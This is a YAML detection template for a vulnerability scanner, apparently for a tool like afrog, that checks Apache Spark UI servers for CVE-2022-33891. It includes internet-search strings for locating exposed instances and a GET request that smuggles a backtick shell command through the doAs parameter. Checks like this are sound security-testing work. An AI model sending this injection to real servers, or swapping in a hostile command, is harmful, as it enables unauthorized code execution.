id: CVE-2022-33891

info:
  name: Apache Spark UI - Remote Command Injection
  author: zan8in
  severity: critical
  verified: false
  description: |-
    shodan: title:"Spark Master at"
    fofa: title="Spark Master at"
  reference:
    - https://github.com/W01fh4cker/cve-2022-33891
    - https://lists.apache.org/thread/p847l3kopoo5bjtmxrcwk21xp6tjxqlc
    - http://packetstormsecurity.com/files/168309/Apache-Spark-Unauthenticated-Command-Injection.html
    - https://nvd.nist.gov/vuln/detail/CVE-2022-33891
    - http://www.openwall.com/lists/oss-security/2023/05/02/1
  tags: cve2022,cve,apache,spark
  created: 2024/02/27

set:
  command: urlencode("echo CVE-2022-33891 | rev")
rules:
  r0:
    request:
      method: GET
      path: /doAs?=`{{command}}`
    expression: response.body.bcontains(b"19833-2202-EVC")
expression: r0()
